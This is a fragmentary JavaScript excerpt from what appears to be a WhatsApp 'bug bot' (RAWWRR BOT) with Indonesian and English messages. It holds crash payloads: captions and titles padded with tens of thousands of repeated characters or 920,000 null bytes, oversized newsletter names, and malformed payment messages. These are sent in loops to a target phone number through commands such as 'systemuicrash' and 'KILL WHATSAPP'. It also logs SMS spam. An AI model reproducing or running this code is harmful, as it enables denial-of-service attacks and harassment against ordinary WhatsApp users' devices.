...
const responbug = 'Mohon ditunggu, BOT sedang bekerja'
...
" -",
" 𝐁𝐫𝐚𝐯𝐨 𝐓𝐞𝐜𝐡𝐧𝐨𝐥𝐨𝐠𝐲",
"𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐁𝐫𝐚𝐯𝐨𝐝𝐮𝐜𝐤 - 𝐁𝐫𝐚𝐯𝐨 𝐓𝐞𝐜𝐡𝐧𝐨𝐥𝐨𝐠𝐲"
]
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"𝐑𝐀𝐖𝐖𝐑𝐑 𝐁𝐎𝐓",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝐑𝐀𝐖𝐖𝐑𝐑 𝐁𝐎𝐓 ✅`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "𝐑𝐀𝐖𝐖𝐑𝐑 𝐁𝐎𝐓" + "\0".repeat(920000),
      ...
      'message': {
        'interactiveMessage': {
          ...
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : '𝐑𝐀𝐖𝐖𝐑𝐑 𝐁𝐎𝐓', url : , merchant_url :  }"
            }],
...
const replyy = (teks) => {
return rxhl.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐑𝐀𝐖𝐖𝐑𝐑 𝐁𝐎𝐓 🌛`,"body": `Hai ${pushname}`, "previewType": "PHOTO","thumbnail": rxhlimage,"sourceUrl": `https://youtube.com/@rxhlofc`}}}, { quoted:m})} 
...
if (!isCreator) return replyz(global.nocreator)
rxhl.public = true
replyz('BOT Success Change To Public')
}
break
...
if (!isCreator) return replyz(global.nocreator)
rxhl.public = false
replyz('BOT Success Change To Self')
}
break
...
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) 𝐑𝐀𝐖𝐖𝐑𝐑 𝐁𝐎𝐓`);
});
}
...
rxhl.sendMessage(from, { caption: `𝐑𝐀𝐖𝐖𝐑𝐑 𝐁𝐎𝐓 !`, video: { url: data.watermark }}, {quoted:m})
})}
break
...
await sleep(2000)
replyz(`*Berhasil Mengirim Serangan Ke ${Pe} Mohon jeda 5 menit*`)
break
...
await sleep(2000)
replyz(`*</> Successfully sent a Attack. Mohon jeda 5 menit 💖*`)
break
...
case 'systemuicrash':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Masukkan nomor target nya')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 20
...
sendRepeatedMessages2(Pe, jumlah)
await sleep(2000)
replyz(`*</> Done ><, Silakan di cek Serangan ke group ${Pe}. Please pause commenting for 3 minutes 🤗`)
break
...
await sleep(2000)
replyz(`*</> Successfully send bug, silakan cek targetnya. Please pause commenting for 3 minutes 🤗`)
break
...
replyz(`</> Done ><, Serangan sudah terkirim silakan di cek ${victim}`)
}
break
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { "caption": `𝐑𝐀𝐖𝐖𝐑𝐑 𝐁𝐎𝐓`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `𝐑𝐀𝐖𝐖𝐑𝐑 𝐁𝐎𝐓`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `𝐑𝐀𝐖𝐖𝐑𝐑 𝐁𝐎𝐓`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `𝐑𝐀𝐖𝐖𝐑𝐑 𝐁𝐎𝐓`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(1500)
}
replyz(`*</> Success *`)
}
...
replyz(`</> Successfully send attack, silakan cek target *${command}* Amount *${amount}*`)
break
...
replyz(`</> Successfully send attack, silahkan cek target*${command}* Amount *${amount}*`)
break
...
replyz(`</> Successfully send attack, silahkan cek targetny kakak 😘 *${command}* Amount *${amount}*`)
break
...
replyz(`</> Successfully send attack, silakan cek target *${command}*`)
break
...
await iponcrash(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {image: rxhlimage, caption: `KILL WHATSAPP BY 𝐑𝐀𝐖𝐖𝐑𝐑 𝐁𝐎𝐓`},{quoted: force})
await sleep(1000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
